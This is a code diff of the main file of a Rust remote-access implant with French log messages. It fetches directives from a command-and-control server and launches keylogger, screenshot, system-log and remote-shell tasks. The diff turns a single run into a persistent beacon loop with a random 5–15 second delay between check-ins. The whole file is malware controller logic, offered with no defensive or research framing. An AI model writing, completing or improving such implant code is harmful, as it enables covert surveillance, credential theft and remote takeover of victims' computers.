@@ -4,65 +4,70 @@ mod logs;
 mod screenshot;
 mod shell;
 use tokio::task::JoinHandle;
+use rand::Rng;
 
 #[tokio::main]
 
 async fn main() {
-    match connexion::get_directives().await {
-        Ok(commands) => {
-            println!("Commands received: {:?}", commands);
-            let mut handles: Vec<JoinHandle<()>> = Vec::new();
+    loop {
+        match connexion::get_directives().await {
+            Ok(commands) => {
+                println!("Commands received: {:?}", commands);
+                let mut handles: Vec<JoinHandle<()>> = Vec::new();
 
-            for command in commands {
-                match command.as_str() {
-                    "keylogger" => {
-                        let handle = tokio::spawn(async {
-                            println!("Démarrage du keylogger...");
-                            let keylogger = input::start_keylogger(10).await;
-                            if let Err(e) = keylogger {
-                                eprintln!("La tâche keylogger a échoué : {:?}", e);
-                            }
-                            println!("Keylogger terminé");
-                        });
-                        handles.push(handle);
+                for command in commands {
+                    match command.as_str() {
+                        "keylogger" => {
+                            let handle = tokio::spawn(async {
+                                println!("Démarrage du keylogger...");
+                                let keylogger = input::start_keylogger(10).await;
+                                if let Err(e) = keylogger {
+                                    eprintln!("La tâche keylogger a échoué : {:?}", e);
+                                }
+                                println!("Keylogger terminé");
+                            });
+                            handles.push(handle);
+                        }
+                        "screenshot" => {
+                            let handle = tokio::spawn(async {
+                                println!("Prise de screenshot...");
+                                screenshot::take_screenshot().await;
+                                println!("Screenshot terminé");
+                            });
+                            handles.push(handle);
+                        }
+                        "logs" => {
+                            let handle = tokio::spawn(async {
+                                println!("Récupération des logs système...");
+                                let log = logs::get_sysinfo().await;
+                                if let Err(e) = log {
+                                    eprintln!("Erreur logs : {:?}", e)
+                                }
+                                println!("Logs terminés");
+                            });
+                            handles.push(handle);
+                        }
+                        "shell" => {
+                            let handle = tokio::spawn(async {
+                                if let Err(e) = shell::launch_shell().await {
+                                    eprintln!("Erreur shell : {}", e);
+                                }
+                            });
+                            handles.push(handle);
+                        }
+                        _ => println!("Commande inconnue: {}", command),
                     }
-                    "screenshot" => {
-                        let handle = tokio::spawn(async {
-                            println!("Prise de screenshot...");
-                            screenshot::take_screenshot().await;
-                            println!("Screenshot terminé");
-                        });
-                        handles.push(handle);
+                }
+                for (i, handle) in handles.into_iter().enumerate() {
+                    match handle.await {
+                        Ok(_) => println!("Tâche {} terminée avec succès", i),
+                        Err(e) => eprintln!("Tâche {} a paniqué : {:?}", i, e),
                     }
-                    "logs" => {
-                        let handle = tokio::spawn(async {
-                            println!("Récupération des logs système...");
-                            let log = logs::get_sysinfo().await;
-                            if let Err(e) = log {
-                                eprintln!("Erreur logs : {:?}", e)
-                            }
-                            println!("Logs terminés");
-                        });
-                        handles.push(handle);
-                    }
-                    "shell" => {
-                        let handle = tokio::spawn(async {
-                            if let Err(e) = shell::launch_shell().await {
-                                eprintln!("Erreur shell : {}", e);
-                            }
-                        });
-                        handles.push(handle);
-                    }
-                    _ => println!("Commande inconnue: {}", command),
                 }
             }
-            for (i, handle) in handles.into_iter().enumerate() {
-                match handle.await {
-                    Ok(_) => println!("Tâche {} terminée avec succès", i),
-                    Err(e) => eprintln!("Tâche {} a paniqué : {:?}", i, e),
-                }
-            }
+            Err(e) => eprintln!("Erreur avec la connexion au C2: {}", e),
         }
-        Err(e) => eprintln!("Erreur avec la connexion au C2: {}", e),
+        let delay = rand::rng().random_range(5..15);
+        tokio::time::sleep(std::time::Duration::from_secs(delay)).await;
     }
 }
